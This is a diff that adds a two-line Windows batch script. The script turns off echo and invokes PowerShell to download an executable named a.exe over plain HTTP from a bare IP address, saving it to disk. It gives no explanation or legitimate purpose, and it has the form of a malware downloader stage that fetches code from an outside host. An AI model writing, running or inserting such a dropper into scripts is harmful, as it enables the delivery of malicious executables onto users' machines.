@@ -1,0 +1,2 @@
+@echo off 
+cmd /c "powershell -c "invoke-webrequest -uri http://103.234.72.65:80/a.exe -outfile a.exe"
